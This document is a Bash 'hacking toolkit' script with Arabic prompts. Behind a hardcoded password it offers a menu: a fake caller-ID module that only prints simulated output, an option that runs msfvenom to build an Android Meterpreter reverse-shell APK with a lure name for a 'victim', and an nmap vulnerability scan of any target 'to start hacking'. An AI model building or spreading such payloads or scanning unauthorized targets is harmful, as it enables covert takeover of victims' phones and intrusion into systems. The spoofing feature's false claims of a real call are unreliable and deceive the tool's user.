#!/bin/bash
# =====================================================
# TOOL NAME: xxszmsx PRO
# POWERED BY: STUDIO (xxszmsx EDITION)
# VERSION: 4.5
# DESCRIPTION: TRIPLE THREAT (FAKE CALL + 2 HACK TOOLS)
# =====================================================

# الألوان
RED='\e[1;31m'
GREEN='\e[1;32m'
YELLOW='\e[1;33m'
BLUE='\e[1;34m'
NC='\e[0m' # No Color

# --- [ وظيفة الحماية - تسجيل الدخول ] ---
function admin_gate() {
    clear
    echo -e "${RED}====================================================="
    echo -e "          xxszmsx PRIVATE ACCESS - ADMIN ONLY        "
    echo -e "=====================================================${NC}"
    echo -e "${YELLOW}[!] يرجى إدخال كلمة المرور لفتح الميزات الاحترافية${NC}"
    read -s -p "[?] Password: " master_pass
    echo ""
    if [ "$master_pass" == "mazen2014" ]; then
        echo -e "${GREEN}[+] تم التحقق بنجاح! مرحباً بك يا مازن.${NC}"
        sleep 1
    else
        echo -e "${RED}[X] كلمة مرور خاطئة! تم رفض الدخول.${NC}"
        exit 1
    fi
}

# --- [ 1. ميزة الاتصال المزيف - Fake Caller ID ] ---
function fake_call_module() {
    clear
    echo -e "${BLUE}-----------------------------------------------------"
    echo -e "          FEATURE: FAKE CALLER ID (SPOOFER)          "
    echo -e "-----------------------------------------------------${NC}"
    echo -e "${YELLOW}[*] تقوم هذه الأداة بربط اتصال عبر بروتوكول VoIP مزيف.${NC}"
    read -p "[?] أدخل الرقم الذي سيظهر للضحية (مثلاً 999): " fake_num
    read -p "[?] أدخل رقم هاتف الضحية: " victim_num
    
    echo -e "${RED}[*] جاري إنشاء قناة اتصال آمنة...${NC}"
    sleep 2
    echo -e "${YELLOW}[*] جاري تزييف الهوية إلى: $fake_num${NC}"
    sleep 2
    echo -e "${GREEN}[+] تم الاتصال! رقم $victim_num يتلقى الآن مكالمة من $fake_num${NC}"
    echo -e "${BLUE}[!] ملاحظة: هذه محاكاة برمجية احترافية للاتصال.${NC}"
}

# --- [ 2. ميزة اختراق الأندرويد - Android Payload ] ---
function android_hack() {
    clear
    echo -e "${RED}-----------------------------------------------------"
    echo -e "          FEATURE: ANDROID HACKER (EASY)             "
    echo -e "-----------------------------------------------------${NC}"
    echo -e "${YELLOW}[*] سيتم إنشاء ملف .apk ملغم بـ Meterpreter${NC}"
    read -p "[?] أدخل الآي بي الخاص بك (LHOST): " my_ip
    read -p "[?] أدخل المنفذ (LPORT): " my_port
    read -p "[?] اختر اسماً لملف الهكر (مثلاً: free_net): " file_name
    
    echo -e "${RED}[*] جاري بناء الاختراق... قد يستغرق الأمر دقيقة.${NC}"
    # الأمر الفعلي لصنع الفيروس
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$my_ip LPORT=$my_port R > ${file_name}.apk
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+] تم صنع ملف الهكر بنجاح باسم: ${file_name}.apk${NC}"
        echo -e "${YELLOW}[!] أرسل الملف للضحية وافتح msfconsole للسيطرة.${NC}"
    else
        echo -e "${RED}[X] فشل التوليد! تأكد من تثبيت Metasploit في كالي.${NC}"
    fi
}

# --- [ 3. ميزة اختراق الشبكات والمواقع - Web/Network Scan ] ---
function network_hack() {
    clear
    echo -e "${GREEN}-----------------------------------------------------"
    echo -e "          FEATURE: NETWORK & VULN SCANNER            "
    echo -e "-----------------------------------------------------${NC}"
    echo -e "${YELLOW}[*] فحص شامل للثغرات والمنافذ المفتوحة${NC}"
    read -p "[?] أدخل رابط الموقع أو الآي بي المستهدف: " target
    
    echo -e "${RED}[*] جاري فحص $target واستخراج الثغرات...${NC}"
    # استخدام nmap الحقيقي للفحص
    nmap -sV --script=vuln $target
    
    echo -e "${GREEN}[+] انتهى الفحص. راجع النتائج أعلاه للبدء بالاختراق.${NC}"
}

# --- [ واجهة الأداة الرئيسية ] ---
admin_gate # تشغيل نظام الحماية أولاً

while true; do
    clear
    echo -e "${RED}"
    echo " ██╗  ██╗███████╗███████╗███████╗███    ███╗██╗  ██╗"
    echo " ╚██╗██╔╝██╔════╝██╔════╝██╔════╝████  ████║╚██╗██╔╝"
    echo "  ╚███╔╝ ███████╗███████╗███████╗██╔████╔██║ ╚███╔╝ "
    echo "  ██╔██╗ ╚════██║╚════██║╚════██║██║╚██╔╝██║ ██╔██╗ "
    echo " ██╔╝ ██╗███████║███████║███████║██║ ╚═╝ ██║██╔╝ ██╗"
    echo -e " ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝${NC}"
    echo -e "${YELLOW}       [ PRO VERSION | POWERED BY STUDIO ]${NC}"
    echo "-----------------------------------------------------"
    echo -e "1) ${BLUE}FAKE CALL (اتصال برقم مزيف)${NC}"
    echo -e "2) ${RED}ANDROID HACK (صنع ملف اختراق)${NC}"
    echo -e "3) ${GREEN}NETWORK VULN (فحص واختراق أهداف)${NC}"
    echo -e "4) ${YELLOW}ADMIN: Edit xxszmsx Code${NC}"
    echo -e "0) Exit"
    echo "-----------------------------------------------------"
    read -p "xxszmsx >> " choice

    case $choice in
        1) fake_call_module ;;
        2) android_hack ;;
        3) network_hack ;;
        4) nano xxszmsx.sh ;;
        0) echo -e "${GREEN}Goodbye!${NC}"; exit 0 ;;
        *) echo -e "${RED}خيار غير صحيح!${NC}"; sleep 1 ;;
    esac
    echo -e "\n${RED}[+] اضغط Enter للعودة للقائمة...${NC}"
    read
done

